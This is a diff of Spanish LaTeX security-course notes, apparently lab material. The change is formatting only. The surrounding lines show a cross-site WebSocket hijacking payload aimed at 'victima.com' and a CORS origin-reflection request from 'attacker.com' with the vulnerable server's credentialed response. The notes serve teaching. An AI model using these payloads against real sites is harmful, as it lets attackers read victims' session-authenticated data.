@@ -1986,7 +1986,7 @@ A partir de aquí: comunicación binaria bidireccional}
   \item 2. El servidor autentica usando solo las cookies de sesión
   \item 3. El servidor no valida el header Origin del handshake
   \item Payload CSWSH (página del atacante)
-  \item[] \cmdbox{HTML en el servidor del atacante:}
+  \item \textbf{HTML en el servidor del atacante:}
   \item \textless{}script\textgreater{}
   \item var ws = new WebSocket('wss://victima.com/chat');
   \item ws.onopen = () =\textgreater{} ws.send(JSON.stringify(\{action:'get\_history'\}));
@@ -2103,9 +2103,9 @@ A partir de aquí: comunicación binaria bidireccional}
   \item Vulnerabilidad --- Reflexión del origen sin validación (Labs 92-93)
   \item El servidor toma el valor del header Origin de la petición y lo devuelve tal cual en ACAO.
   \item Resultado: cualquier origen puede leer la respuesta, incluidos datos sensibles.
-  \item[] \cmdbox{Petición del atacante:}
+  \item \textbf{Petición del atacante:}
   \item \cmd{Origin: https://attacker.com}
-  \item[] \cmdbox{Respuesta del servidor vulnerable:}
+  \item \textbf{Respuesta del servidor vulnerable:}
   \item \cmd{Access-Control-Allow-Origin: https://attacker.com}
   \item \cmd{Access-Control-Allow-Credentials: true}
   \item Código del ataque (Lab 92)
